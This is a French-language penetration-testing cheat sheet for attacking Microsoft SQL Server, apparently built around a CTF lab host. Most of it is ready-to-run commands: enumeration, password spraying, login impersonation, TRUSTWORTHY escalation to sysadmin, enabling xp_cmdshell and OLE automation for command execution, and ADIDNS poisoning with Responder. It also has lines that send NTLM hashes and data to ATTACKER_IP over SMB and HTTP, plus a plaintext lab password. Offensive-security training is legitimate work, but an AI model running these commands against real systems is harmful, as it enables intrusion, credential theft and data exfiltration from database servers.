# MSSQL Enumeration

```sql
# ============================================
# FICHE D'ÉNUMÉRATION MSSQL - PENTEST
# ============================================

# --- CONNEXION ---
impacket-mssqlclient -port PORT DOMAIN/USER@IP -windows-auth
impacket-mssqlclient -port PORT USER@IP  # Sans domain

# --- ÉNUMÉRATION BASIQUE ---
SELECT @@version;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT DB_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');

# --- LISTER LES BASES DE DONNÉES ---
SELECT name FROM sys.databases;
USE nom_database;

# --- LISTER LES TABLES ---
Sp_tables;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
SELECT name FROM sys.tables WHERE is_ms_shipped = 0;

# --- DUMP UNE TABLE ---
SELECT * FROM nom_table;

# --- PERMISSIONS UTILISATEUR ---
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
SELECT USER_NAME(), IS_MEMBER('db_owner');

# --- LINKED SERVERS (IMPORTANT!) ---
SELECT * FROM sys.servers;
SELECT * FROM sys.linked_logins;
EXEC sp_helpserver;
SELECT * FROM OPENQUERY([SERVER_NAME], 'SELECT @@version');
EXEC ('SELECT SYSTEM_USER') AT [SERVER_NAME];

# --- SQL AGENT JOBS (CREDENTIALS POSSIBLES) ---
USE msdb;
SELECT job_id, name, enabled, description FROM dbo.sysjobs;
SELECT j.name, s.step_name, s.command FROM dbo.sysjobs j INNER JOIN dbo.sysjobsteps s ON j.job_id = s.job_id;

# --- PROCÉDURES STOCKÉES CUSTOM ---
SELECT name, type_desc FROM sys.objects WHERE type IN ('P','PC','FN') AND is_ms_shipped = 0;
SELECT OBJECT_NAME(object_id), definition FROM sys.sql_modules WHERE is_ms_shipped = 0;

# --- TRIGGERS ---
SELECT name, type_desc FROM sys.triggers WHERE is_ms_shipped = 0;

# --- LOGINS ET USERS ---
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U');
SELECT name, type_desc FROM sys.database_principals WHERE type NOT IN ('R','A');

# --- IMPERSONATION ---
SELECT pr.name, pe.permission_name FROM sys.server_permissions pe INNER JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_id WHERE pe.permission_name = 'IMPERSONATE';

# --- TRUSTWORTHY (ESCALADE DE PRIVILÈGES) ---
SELECT name, SUSER_SNAME(owner_sid) AS owner, is_trustworthy_on FROM sys.databases;

# --- CONFIGURATIONS SERVEUR ---
SELECT name, value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled');

# --- ÉNUMÉRATION FILESYSTEM ---
EXEC xp_dirtree 'C:\', 1, 1;
EXEC xp_dirtree 'C:\Users', 3, 1;

# --- CAPTURE HASH NTLM ---
EXEC xp_dirtree '\\ATTACKER_IP\share';

# --- RCE SI SYSADMIN ---
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# --- ESCALADE DB_OWNER → SYSADMIN (SI TRUSTWORTHY=1) ---
USE database_name;
CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'USER', 'sysadmin';
EXEC sp_elevate;
SELECT IS_SRVROLEMEMBER('sysadmin');

# --- ADIDNS POISONING (AVEC CREDENTIALS DOMAIN) ---
# Sur Kali:
bloodyAD -d DOMAIN -u USER -p 'PASS' --host DC_IP add dnsRecord HOSTNAME ATTACKER_IP
dnstool.py -u 'DOMAIN\USER' -p 'PASS' --record 'HOSTNAME' --action add --data ATTACKER_IP DC_IP

# Lance Responder
sudo responder -I tun0 -v

# Force connexion depuis SQL
SELECT * FROM OPENQUERY([HOSTNAME], 'SELECT 1');
EXEC ('SELECT 1') AT [HOSTNAME];

# --- OLE AUTOMATION (RCE ALTERNATIF) ---
DECLARE @obj INT;
EXEC sp_OACreate 'WScript.Shell', @obj OUT;
EXEC sp_OAMethod @obj, 'Run', NULL, 'cmd /c whoami';

# --- LECTURE FICHIERS ---
SELECT * FROM OPENROWSET(BULK 'C:\path\file.txt', SINGLE_CLOB) AS x;

# --- EXFILTRATION HTTP ---
DECLARE @obj INT, @response VARCHAR(8000);
EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @obj OUT;
EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://ATTACKER_IP:8000/', FALSE;
EXEC sp_OAMethod @obj, 'send';
```



## <mark style="color:red;">Énumération MS-SQL</mark>

***

### <mark style="color:blue;">1. Introduction</mark>

### Qu'est-ce que MS-SQL Server?

Microsoft SQL Server est un système de gestion de base de données relationnelle (SGBDR) développé par Microsoft. Dans le contexte pentest, il est souvent mal configuré et peut être une porte d'entrée vers l'escalade de privilèges.

#### Ports par défaut

| Port | Service        | Description               |
| ---- | -------------- | ------------------------- |
| 1433 | MS-SQL         | Port par défaut TCP       |
| 1434 | MS-SQL Browser | Service de découverte UDP |

#### Types d'authentification

**SQL Authentication (Local)**

* Comptes stockés dans SQL Server
* Format: `username:password`
* Commande: `impacket-mssqlclient user:pass@IP`

**Windows Authentication (Domain)**

* Authentification via Active Directory
* Format: `DOMAIN\user:password`
* Commande: `impacket-mssqlclient DOMAIN/user:pass@IP -windows-auth`

***

### <mark style="color:blue;">2. Énumération avec NetExec (nxc)</mark>&#x20;

#### 2.1 Installation et Setup

```bash
# Installation via pipx (recommandé)
pipx install netexec

# Ou via pip
pip install netexec

# Vérifier l'installation
nxc mssql --help
```

#### 2.2 Connexion de Base

**Test de connexion simple**

```bash
nxc mssql <IP> -u <username> -p <password>
```

**Exemple:**

```bash
nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!'
```

**Output attendu:**

```
MSSQL       10.10.11.95     1433   DC01    [*] Windows 11 / Server 2025 Build 26100
MSSQL       10.10.11.95     1433   DC01    [+] kevin:iNa2we6haRj2gaw!
```

**Authentification locale (--local-auth)**

```bash
nxc mssql <IP> -u <username> -p <password> --local-auth
```

**Différence importante:**

* **Sans `--local-auth`**: Tente Windows Auth via domaine
* **Avec `--local-auth`**: Force SQL Authentication locale

#### 2.3 Lister les Modules Disponibles

```bash
nxc mssql -u username -p password --local-auth -L
```

**Modules LOW PRIVILEGE (sans admin):**

**ENUMERATION**

* `enum_impersonate` - Énumère les droits d'impersonation
* `enum_links` - Énumère les serveurs SQL liés
* `enum_logins` - Énumère les comptes SQL (SQL, Domain, Local)

**PRIVILEGE ESCALATION**

* `enable_cmdshell` - Active/désactive xp\_cmdshell
* `exec_on_link` - Exécute commandes sur serveur lié
* `link_enable_cmdshell` - Active xp\_cmdshell sur serveur lié
* `link_xpcmd` - Exécute xp\_cmdshell sur serveur lié
* `mssql_coerce` - Exécute commandes SQL arbitraires
* `mssql_priv` - Énumère et exploite privilèges SQL

**Modules HIGH PRIVILEGE (admin requis):**

* `nanodump` - Dump LSASS avec nanodump + pypykatz
* `empire_exec` - Génère launcher Empire
* `met_inject` - Injecte Meterpreter en mémoire
* `web_delivery` - Payload via Metasploit web\_delivery

#### 2.4 Module: enum\_logins

**Commande**

```bash
nxc mssql <IP> -u <user> -p <password> --local-auth -M enum_logins
```

**Exemple**

```bash
nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -M enum_logins
```

**Output**

```
ENUM_LOGINS  10.10.11.95    1433   DC01    [*] Enumerated logins
ENUM_LOGINS  10.10.11.95    1433   DC01    Login Name    Type         Status
ENUM_LOGINS  10.10.11.95    1433   DC01    ----------    ----         ------
ENUM_LOGINS  10.10.11.95    1433   DC01    appdev        SQL User     ENABLED
ENUM_LOGINS  10.10.11.95    1433   DC01    kevin         SQL User     ENABLED
ENUM_LOGINS  10.10.11.95    1433   DC01    sa            SQL User     ENABLED
```

**Interprétation:**

* `sa` = System Administrator (compte le plus privilégié)
* `SQL User` = Authentification SQL (pas Windows)
* `ENABLED` = Compte actif

#### 2.5 Module: enum\_impersonate

**Commande**

```bash
nxc mssql <IP> -u <user> -p <password> --local-auth -M enum_impersonate
```

**Exemple**

```bash
nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -M enum_impersonate
```

**Output**

```
ENUM_IMP...  10.10.11.95    1433   DC01    [+] Users with impersonation rights:
ENUM_IMP...  10.10.11.95    1433   DC01    [*]   - appdev
```

**Signification:**

* Le compte `kevin` peut se faire passer pour `appdev`
* C'est une escalade de privilèges potentielle
* Voir section SQL Native pour exploitation

#### 2.6 Module: enum\_links

**Commande**

```bash
nxc mssql <IP> -u <user> -p <password> --local-auth -M enum_links
```

**Utilité:**

* Découvre les serveurs SQL liés (Linked Servers)
* Permet pivoting entre serveurs SQL
* Peut révéler des serveurs internes

#### 2.7 Module: mssql\_priv

**Commande**

```bash
nxc mssql <IP> -u <user> -p <password> --local-auth -M mssql_priv
```

**Ce module énumère:**

* Privilèges du compte actuel
* Permissions sur bases de données
* Rôles serveur (sysadmin, etc.)
* Possibilités d'escalade

#### 2.8 Énumération avec Password Spraying

**Test multiple utilisateurs**

```bash
nxc mssql <IP> -u users.txt -p password
```

**Test multiple mots de passe**

```bash
nxc mssql <IP> -u username -p passwords.txt
```

**Bruteforce combiné**

```bash
nxc mssql <IP> -u users.txt -p passwords.txt --no-bruteforce
```

**Option `--no-bruteforce`:**

* Teste user1:pass1, user2:pass2, etc.
* Évite de tester toutes les combinaisons (plus discret)

#### 2.9 Exécution de Requêtes SQL

**Commande directe**

```bash
nxc mssql <IP> -u <user> -p <password> -q "SELECT @@VERSION"
```

**Exemple**

```bash
nxc mssql 10.10.11.95 -u kevin -p 'password' -q "SELECT name FROM sys.databases"
```

***

### <mark style="color:blue;">3. Énumération avec Commandes SQL Natives</mark>&#x20;

#### 3.1 Connexion avec Impacket

**Syntax de base**

```bash
impacket-mssqlclient [DOMAIN/]user:password@IP [-windows-auth]
```

**Exemples**

```bash
# SQL Authentication
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.10.11.95

# Windows Authentication
impacket-mssqlclient EIGHTEEN/kevin:'password'@10.10.11.95 -windows-auth
```

#### 3.2 Informations sur le Serveur

**Version du serveur**

```sql
SELECT @@VERSION;
```

**Output exemple:**

```
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64)
Windows Server 2025 Datacenter
```

**Informations système**

```sql
-- Nom du serveur
SELECT @@SERVERNAME;

-- Nom de l'instance
SELECT @@SERVICENAME;

-- Langue du serveur
SELECT @@LANGUAGE;
```

**Configuration globale**

```sql
-- Toutes les configurations
EXEC sp_configure;

-- Configuration spécifique (xp_cmdshell)
EXEC sp_configure 'xp_cmdshell';
```

#### 3.3 Énumération des Utilisateurs

**Utilisateur actuel**

```sql
-- Login SQL actuel
SELECT SYSTEM_USER;

-- Utilisateur dans la DB
SELECT USER_NAME();

-- Informations complètes
SELECT 
    SUSER_NAME() AS LoginName,
    USER_NAME() AS DatabaseUser,
    ORIGINAL_LOGIN() AS OriginalLogin;
```

**Liste tous les logins**

```sql
SELECT 
    name,
    type_desc,
    is_disabled,
    create_date,
    modify_date
FROM sys.server_principals
WHERE type IN ('S', 'U', 'G')
ORDER BY name;
```

**Types:**

* `S` = SQL Login
* `U` = Windows User
* `G` = Windows Group

**Logins avec sysadmin**

```sql
SELECT 
    p.name,
    p.type_desc
FROM sys.server_principals p
JOIN sys.server_role_members rm ON p.principal_id = rm.member_principal_id
JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
WHERE r.name = 'sysadmin';
```

#### 3.4 Énumération des Rôles

**Rôles serveur disponibles**

```sql
SELECT name FROM sys.server_principals WHERE type = 'R';
```

**Rôles standards:**

```
sysadmin          - Contrôle total
securityadmin     - Gère logins et permissions
serveradmin       - Configure serveur
setupadmin        - Gère linked servers
processadmin      - Gère processus SQL
diskadmin         - Gère fichiers disque
dbcreator         - Crée/modifie databases
bulkadmin         - Exécute BULK INSERT
```

**Membres d'un rôle**

```sql
-- Exemple: membres sysadmin
EXEC sp_helpsrvrolemember 'sysadmin';
```

**Rôles de l'utilisateur actuel**

```sql
-- Méthode 1
SELECT USER_NAME();
EXEC sp_helpsrvrolemember;

-- Méthode 2
SELECT 
    r.name AS RoleName
FROM sys.server_role_members rm
JOIN sys.server_principals p ON rm.member_principal_id = p.principal_id
JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
WHERE p.name = SYSTEM_USER;
```

#### 3.5 Énumération des Permissions

**Permissions IMPERSONATE**

```sql
-- Vérifier permissions IMPERSONATE
SELECT 
    pr.name AS Grantee,
    pe.permission_name,
    pe.state_desc
FROM sys.server_permissions AS pe
JOIN sys.server_principals AS pr ON pe.grantee_principal_id = pr.principal_id
WHERE pe.permission_name = 'IMPERSONATE';
```

**Identifier qui peut être impersonné**

```sql
SELECT 
    pr.name AS Grantee,
    p2.name AS CanImpersonate
FROM sys.server_permissions AS pe
JOIN sys.server_principals AS pr ON pe.grantee_principal_id = pr.principal_id
JOIN sys.server_principals AS p2 ON pe.major_id = p2.principal_id
WHERE pe.permission_name = 'IMPERSONATE';
```

**Toutes les permissions d'un utilisateur**

```sql
SELECT 
    pe.class_desc,
    pe.permission_name,
    pe.state_desc,
    p2.name AS ObjectName
FROM sys.server_permissions pe
JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_id
LEFT JOIN sys.server_principals p2 ON pe.major_id = p2.principal_id
WHERE pr.name = 'kevin';
```

#### 3.6 Énumération des Bases de Données

**Lister toutes les databases**

```sql
-- Méthode 1 (classique)
SELECT name FROM master..sysdatabases;

-- Méthode 2 (moderne)
SELECT name, database_id, create_date 
FROM sys.databases;
```

**Informations détaillées**

```sql
SELECT 
    name,
    database_id,
    create_date,
    compatibility_level,
    state_desc,
    recovery_model_desc,
    is_trustworthy_on
FROM sys.databases;
```

**Attention à `is_trustworthy_on = 1`:**

* Permet escalade de privilèges
* Base peut exécuter code avec privilèges élevés

**Changer de database**

```sql
USE database_name;
```

**Base de données actuelle**

```sql
SELECT DB_NAME();
```

#### 3.7 Énumération des Tables

**Lister toutes les tables**

```sql
-- Dans la DB actuelle
SELECT TABLE_NAME 
FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_TYPE = 'BASE TABLE';

-- Avec schéma
SELECT TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_TYPE = 'BASE TABLE';
```

**Tables système**

```sql
SELECT name FROM sys.tables;
```

**Colonnes d'une table**

```sql
SELECT 
    COLUMN_NAME,
    DATA_TYPE,
    CHARACTER_MAXIMUM_LENGTH,
    IS_NULLABLE
FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_NAME = 'users';
```

#### 3.8 Impersonation SQL

**Vérifier possibilité d'impersonation**

```sql
-- Étape 1: Vérifier permissions
SELECT * 
FROM sys.server_permissions 
WHERE permission_name = 'IMPERSONATE';

-- Étape 2: Identifier l'utilisateur cible
SELECT principal_id, name, type_desc 
FROM sys.server_principals 
WHERE principal_id = <major_id_from_step1>;
```

**Exécuter l'impersonation**

```sql
-- Méthode 1: EXECUTE AS LOGIN
EXECUTE AS LOGIN = 'appdev';
SELECT SYSTEM_USER;  -- Vérifier
REVERT;  -- Revenir

-- Méthode 2: EXECUTE AS USER (dans une DB)
USE database_name;
EXECUTE AS USER = 'appdev';
SELECT USER_NAME();  -- Vérifier
REVERT;
```

**Avec Impacket**

```sql
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev'
SQL (appdev  appdev@master)> 

-- Ou commande directe
SQL> exec_as_login appdev
```

#### 3.9 Énumération des Linked Servers

**Lister linked servers**

```sql
-- Méthode 1
EXEC sp_linkedservers;

-- Méthode 2
SELECT name, product, provider, data_source 
FROM sys.servers 
WHERE is_linked = 1;
```

**Tester connexion à linked server**

```sql
EXEC sp_testlinkedserver 'LinkedServerName';
```

**Exécuter requête sur linked server**

```sql
-- Syntax
SELECT * FROM [LinkedServerName].[DatabaseName].[Schema].[TableName];

-- Exemple
SELECT * FROM [SQLPROD].[master].[sys].[databases];
```

**Exécuter avec OPENQUERY**

```sql
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT @@VERSION');
```

#### 3.10 Vérification xp\_cmdshell

**État de xp\_cmdshell**

```sql
EXEC sp_configure 'xp_cmdshell';
```

**Activer xp\_cmdshell (nécessite sysadmin)**

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Tester xp\_cmdshell**

```sql
EXEC xp_cmdshell 'whoami';
```

#### 3.11 Énumération des Jobs

**Lister SQL Server Agent Jobs**

```sql
SELECT 
    job_id,
    name,
    enabled,
    date_created,
    date_modified
FROM msdb.dbo.sysjobs;
```

**Détails d'un job**

```sql
EXEC msdb.dbo.sp_help_job @job_name = 'JobName';
```

***

***
